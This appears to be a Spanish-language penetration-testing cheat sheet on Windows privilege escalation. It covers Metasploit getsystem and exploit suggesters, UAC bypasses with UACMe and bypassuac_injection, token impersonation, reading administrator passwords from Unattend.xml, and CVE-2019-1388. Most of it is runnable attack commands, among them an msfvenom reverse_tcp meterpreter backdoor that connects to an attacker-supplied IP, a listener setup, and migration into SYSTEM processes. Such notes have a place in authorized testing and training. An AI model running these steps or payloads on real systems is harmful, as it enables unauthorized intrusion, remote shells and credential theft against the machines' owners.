### Getsystem Metasploit
Una vez establecida una sesión de meterpreter, lanzando el comando *getsystem* tratará de elevar privilegios con varias técnicas. Si esto no funciona, ya podemos tratar de hacer un UACBypass y luego volver a meter el *getsystem* o combinarlo también con cualquier otra técnica.

### Exploit Suggester Metasploit
En windows, si establecemos una sesión de meterpreter con metasploit, podemos lanzar un módulo para intentar realizar la escalada de privilegios. Una vez estableceida la sesión con la víctima:

```bash
# Mandamos el proceso de la sesión al segundo plano
background
# buscamos el exploit y lo cargamos
search local_exploit_suggester
# localizamos la sesión que pusimos en segundo plano
sessions -l
# cargamos la sesión
set SESSION <numero>
# lanzar la búsqueda de exploits para la escalada de privilegios
run
# tendremos una lista de exploits, de los vulnerables, copiamos el exploit, ejemplo: /windows/local/tokenmagic
# cargar el exploit, rellenar los campos y lanzar
use /windows/local/tokenmagic
```

### "Manual" exploit suggester
[Exploit Suggester .py Github](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

1- Una vez obtenida una shell, debemos lanzar el comando **systeminfo** y guardar el resultado en un fichero de texto.

2 - Actualizamos la base de datos del suggester, y nos genera un xls con la bbdd de las últimas vulnerabilidades.
```bash
#Dependencias:
install python-xlrd
pip install xlrd --update

# Actuali,zar la bbdd
./wubdiws-exploit-suggester.py --update
```

3º Lanzar el suggester (en la maquina atacante)
```bash
./windows-exploit-suggester.py --database la_bbdd_que_genera_el_update_anterior.xls --systeminfo el_resultado_del_coando_systeminfo.txt
```

Esto nos sugerirá diferentes exploits en base a la infromación dada, que podremos utilizar para la escalada de privilegios.

### UAC bypass con UACMe
[UACMe Github](https://github.com/hfiref0x/UACME)
Teniendo acceso a la máquina víctima, la idea es crear y subir un backdoor junto con UACMe para ejecutar ese backdoor (que será una reverse meterpreter), pero con privilegios saltándonos el UAC.

1º - Teniendo una sesión de meterpreter ya establecida, iniciar una segunda sesión que estará a la escucha para cuando lancemos el **Akagi64.exe**
```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=<ip_atacante>
set LPORT=<puerto_para_el_backdoor>
run

# Aqui estaremos a la espera hasta que en la primera sesión lancemos el "payload" y será cuando en la sesión 2 obtengamos una shell con privilegios.
```

2º - Crear el backdoor con msfvenom y subirlo junto el UACMe
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_atacante> LPORT=<puerto_para_el_backdoor> -f exe > backdoor.exe

# En la sesión 1 establecida anteriormente, subimos los ficheros
cd C:\\
mkdir temp
cd temp
upload backdoor.exe
upload Akagi64.exe
.\Akagi64.exe <método> C:\temp\backdoor.exe
#EJEMPLO
.\Akagi64.exe 23 C:\temp\backdoor.exe
##### CADA MÉTODO ESTÁ ORIENTADO A UN S.O Y V ERSION DIFERENTE, PARA VER LOS MÉTODOS Y LA VERSION DE WINDOWS ASOCIADA MIRAR LA DOCUMENTACIÓN DE GITHUB
```

3º - Escalar a NT AUTHORITY\SYSTEM. Para ello localizamos un proceso lanzado por NT AUTHORITY\SYSTEM y anotamos el PID
```bash
#Estando en una sesión de meterpreter (NO SHELL)
ps
migrate <PID>
sysinfo
getuid
```

### UACBypass Injection
Con una sesión de metrpreter establecida.
```bash
search bypassuac
elegir bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION <num sesion establecida anteriormente> <para salir de una sesión ctrl Z y "background"
set LPORT <cambiar el de por defecto que conicidirá con la otra sesión>
set TARGET <tabular> y escribir la que nos interese (x64 o x86)
run
getsystem (para escalar privilegios abusando del UACBypass)
getuid (para comprobar que ha funcionado)
```
### Suplantación de token de acceso (Impersonate token)
Al ya tener acceso a la máquina con algún usuario, podemos tratar de suplantar el token de inicio de sesión de otro usuario que tenga mayores privilegios. Para ello es **requisito indispensable** tener al menos estos privilegios en el usuario con el que tenemos acceso a la máquina:

**getprivs**
* SeAssignPrimaryToken
* SeCreateToken
* SeImpersonatePrivilege

#### Con metasploit
```bash
#teniendo una sesión de meterpreter, cargamos el modo incógnito
load incognito

# Listamos los tokens disponibles
 list_tokens -u
# Veremos los token disponibles, algo así:
Delegation Tokens Available
========================
MACHINE\Administrator
MACHINE\guest

# Ahora para pivotar al usuario Administrator, metemos el comando en meterpreter
impersonate_token "MACHINE\Administrator"

#Migramos a otro proceso, por ejemplo "explorer"
pgrep explorer
migrate <PID>

# para escalar a NT AUTHORITY SISYTEM repetimos la operacion anterior, listamos los token y lo suplantamos
```

### Credential dumping en ficheros de configuracion
Cuando se realiza una instalación masiva desatendida, las claves se suelen almacenar (a veces en base64), en los siguientes ficheros:
 ```bash
  C:\\Windows\Panther\Unattend.xml
  C:\\Windows\Panther\Autounattend.xml

### AL FINAL DEL FICHERO ENCONTRAMOS
<AutoLogon>
	<Password>
		<value>CONTRASEÑA</value>
```

Esto puede ser interesante porque la contraseña que se suele almacenar es la del administrador, de cara a la escalada de privilegios.

### CVE-2019-1388 (Privesc)
Vulnerabilidad que afecta a ciertas versiones de windows. 

Consiste en abrir un ejecutable y nos pedirá credenciales de administrador, no las meteremos, le daremos a más detalles y luego a "ver mas información acerca del certificado".

Una vez en el certificado, en el apartado de "Issued By", clicamos en el "link" y se nos abrirá un navegador por detrás con permisos de Administrador. Ya podemos cerrar el certificado y salir del UAC.

Una vez cargue, o no, da igual, la web. Tratamos de guardar la página con "File > Save As". y ahí que tegamos el explorador de windows abierto (con los mismos privilegios de administrador que el navegador), abrimos un CMD. Y ya tenemos un cmd con privilegios de administrador.
